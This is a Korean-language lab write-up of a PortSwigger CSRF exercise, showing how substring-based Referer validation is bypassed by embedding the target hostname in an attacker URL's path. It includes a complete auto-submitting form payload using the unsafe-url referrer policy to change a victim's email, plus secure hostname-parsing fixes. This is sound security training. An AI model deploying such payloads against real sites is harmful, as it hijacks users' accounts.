# Lab: CSRF with broken Referer validation

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — Referer 헤더 검증 우회 / 부분 문자열 검색 취약점 / Referrer-Policy
- **링크**: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

## 목표

서버가 Referer 헤더를 호스트(host) 단위가 아닌 **URI 전체에서 문자열 포함 여부**로 검증하는 취약점을 이용한다. 공격자 도메인 URL의 경로 부분에 대상 호스트명을 삽입하면 검증을 통과하여 이메일을 변경할 수 있다.

## 011 랩과의 비교

```
[011 랩 — Referer 헤더 존재 여부 취약점]
  Referer 없으면 → 검증 생략 → 통과
  우회: Referer 헤더 자체를 제거

[012 랩 — Referer 검증 로직 취약점]
  Referer 있어도 → 검증 로직이 잘못됨 → 통과
  우회: Referer 헤더는 존재하지만 값을 조작
```

## 취약한 Referer 검증 로직

```python
# 취약한 구현 — 전체 URI 문자열 포함 여부만 확인
def validate_referer(request):
    referer = request.headers.get('Referer', '')
    if 'target.com' in referer:      # ← 부분 문자열 검색
        return True
    return False

# 문제:
# 'target.com' in 'https://evil.com/target.com'  → True  ← 우회 가능!
# 'target.com' in 'https://target.com/page'      → True  ← 정상
# 'target.com' in 'https://evil.com/page'        → False ← 차단
```

```
올바른 검증 vs 취약한 검증:

[올바른 — host 단위 검증]
  URL 파싱 후 hostname 만 비교:
  urllib.parse.urlparse(referer).hostname == 'target.com'
  
  'https://evil.com/target.com' → hostname = 'evil.com' → 불일치 → 거부
  'https://target.com/page'     → hostname = 'target.com' → 일치 → 허용

[취약한 — 문자열 포함 검색]
  'target.com' in referer
  
  'https://evil.com/target.com' → True → 허용 ← 우회!
  'https://target.com/page'     → True → 허용
```

## 공격 방법

### 핵심 아이디어

```
공격자 exploit 서버 URL 에 대상 호스트명을 경로로 포함:

  일반 exploit URL:
    https://exploit-server.net/exploit
    → Referer: https://exploit-server.net/exploit
    → 'target.com' in Referer → False → 차단

  조작된 exploit URL:
    https://exploit-server.net/target.com
    → Referer: https://exploit-server.net/target.com
    → 'target.com' in Referer → True → 통과!
```

### Referrer-Policy: unsafe-url 필요

```html
<!-- 브라우저 기본값: Referer 에 경로까지 포함하지 않을 수 있음 -->
<!-- 전체 URL 이 Referer 에 포함되도록 강제 -->
<meta name="referrer" content="unsafe-url">
```

```
기본 Referrer-Policy 동작:
  strict-origin-when-cross-origin (Chrome 기본값):
  크로스 사이트 요청 시 → origin 만 전송 (경로 제외)
  Referer: https://exploit-server.net/  ← 경로 잘림

  unsafe-url 설정 시:
  크로스 사이트 요청 시 → 전체 URL 전송
  Referer: https://exploit-server.net/target.com  ← 경로 포함!
  → 대상 호스트명이 Referer 에 포함 → 검증 통과
```

### 최종 페이로드

```html
<!-- exploit 서버에서 경로를 /target.com 으로 설정 후 호스팅 -->
<!-- URL: https://exploit-server.net/target.com -->
<html>
  <head>
    <!-- 전체 URL(경로 포함)이 Referer 로 전송되도록 강제 -->
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://target.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 실행 흐름

```
1. 피해자가 https://exploit-server.net/target.com 방문

2. 브라우저:
   unsafe-url 정책 → 전체 URL 을 Referer 로 전송
   폼 자동 제출:
   
   POST /my-account/change-email
   Cookie: session=VICTIM_SESSION
   Referer: https://exploit-server.net/target.com   ← 경로에 target.com 포함

3. 서버 검증:
   'target.com' in 'https://exploit-server.net/target.com'
   → True → 검증 통과!

4. 이메일 변경 처리 → 공격 성공
```

## Referer URL 구조와 조작 위치

```
Referer URL 구조:
  https://evil.com:8080/path/to/page?query=value#hash
  └──────┘ └─────┘└───┘└──────────┘└──────────┘└────┘
  scheme   host   port  path        query       hash

서버가 'target.com' in referer 로 검사할 때 통과 가능한 위치:

  경로(path):  https://evil.com/target.com/exploit
  쿼리(query): https://evil.com/exploit?ref=target.com
  서브도메인:  https://target.com.evil.com/exploit  ← 더 자연스러움

각 위치별 제어 가능 여부:
  경로: 공격자 서버에서 URL 경로 지정 가능 → 이번 랩 사용
  쿼리: 공격자 서버에서 쿼리스트링 지정 가능
  서브도메인: DNS 설정 필요 → 더 복잡
```

## 이전 CSRF Referer 랩들과의 비교

| 항목 | 011 랩 | 012 랩 (이번) |
|------|--------|--------------|
| Referer 처리 | 없으면 통과 | 있어도 검증 로직 우회 |
| 우회 방법 | `no-referrer` 로 헤더 제거 | 경로에 대상 도메인 삽입 |
| Referer 헤더 | 요청에 포함 안 됨 | 포함되지만 값 조작 |
| 추가 설정 | `<meta name="referrer" content="no-referrer">` | `<meta name="referrer" content="unsafe-url">` |
| 취약 로직 | 존재 여부만 확인 | 문자열 포함 여부만 확인 |

## 핵심 정리

- 서버가 Referer 헤더를 **URL 전체에서 문자열 포함 여부**로 검증하면, 공격자는 자신의 도메인 URL 경로에 대상 호스트명을 넣어 우회할 수 있다.
- `<meta name="referrer" content="unsafe-url">` 로 브라우저가 경로까지 포함한 전체 Referer URL을 전송하도록 강제한다.
- **올바른 Referer 검증**: 전체 문자열이 아닌 **파싱된 호스트(hostname)** 만 비교해야 한다.
- **근본적 방어**: Referer 검증보다 CSRF 토큰 또는 SameSite 쿠키 사용이 더 신뢰할 수 있다.

## 배운 점 및 추가 학습

### 1. URL 파싱 기반의 올바른 Referer 검증

```python
from urllib.parse import urlparse

def validate_referer(request):
    referer = request.headers.get('Referer', '')
    if not referer:
        return False  # 없으면 거부

    parsed = urlparse(referer)

    # 호스트만 정확히 비교
    allowed_hosts = {'target.com', 'www.target.com'}
    return parsed.hostname in allowed_hosts

# 검증:
# 'https://evil.com/target.com' → hostname='evil.com' → False ✓
# 'https://target.com/page'     → hostname='target.com' → True ✓
# 'https://target.com.evil.com' → hostname='target.com.evil.com' → False ✓
```

```javascript
// Node.js 예시
function validateReferer(referer) {
    if (!referer) return false;
    try {
        const url = new URL(referer);
        return url.hostname === 'target.com';
    } catch {
        return false;
    }
}
```

### 2. 부분 문자열 검색의 위험한 패턴

```python
# 위험한 패턴들:
'target.com' in referer                          # ← 이번 랩
referer.find('target.com') != -1
re.search('target.com', referer)                 # 이스케이프 없이 사용

# 더 정교해 보이지만 여전히 위험:
referer.startswith('https://target.com')
# → 우회: https://target.com.evil.com/...
#   startswith 통과!

# 안전한 패턴:
urlparse(referer).hostname == 'target.com'       # ✓
urlparse(referer).hostname.endswith('.target.com') and \
urlparse(referer).hostname.count('.') >= 1       # 서브도메인 허용 시
```

### 3. Referrer-Policy 값과 크로스 사이트 전송 내용

```
no-referrer:
  크로스 사이트: Referer 미전송

no-referrer-when-downgrade:
  크로스 사이트 HTTPS→HTTPS: 전체 URL 전송
  크로스 사이트 HTTPS→HTTP: 미전송

same-origin:
  크로스 사이트: Referer 미전송

strict-origin:
  크로스 사이트: origin 만 전송 (경로 없음)
  → Referer: https://evil.com/
  → evil.com/target.com 경로 정보 없음 → 공격 실패

strict-origin-when-cross-origin (Chrome 기본값):
  크로스 사이트: origin 만 전송
  → 기본값으로는 경로 포함 안 됨

unsafe-url:
  항상 전체 URL 전송 (scheme + host + path + query)
  → Referer: https://evil.com/target.com  ← 경로 포함
  → 이번 공격에 필요한 설정
```

### 4. Referer 헤더를 통한 정보 유출 주의

```
unsafe-url 정책의 부작용:
  민감한 경로나 쿼리스트링이 Referer 로 유출될 수 있음

예시:
  https://target.com/account?token=SECRET
  → 외부 링크 클릭 시 Referer: https://target.com/account?token=SECRET
  → 외부 사이트 서버 로그에 토큰 노출

권장 정책:
  strict-origin-when-cross-origin (Chrome 기본값)
  → 크로스 사이트: origin 만 전송 → 경로/쿼리 유출 없음
  → 보안과 호환성 균형
```


